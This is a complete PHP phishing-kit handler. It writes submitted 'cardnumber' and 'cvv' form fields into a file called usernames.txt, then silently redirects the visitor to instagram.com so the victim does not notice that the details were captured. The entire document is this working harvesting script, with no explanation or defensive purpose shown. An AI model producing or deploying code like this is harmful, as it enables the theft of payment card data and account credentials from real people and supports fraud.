<?php

file_put_contents("usernames.txt", "Account: " . $_POST['cardnumber'] . " Pass: " . $_POST['cvv'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
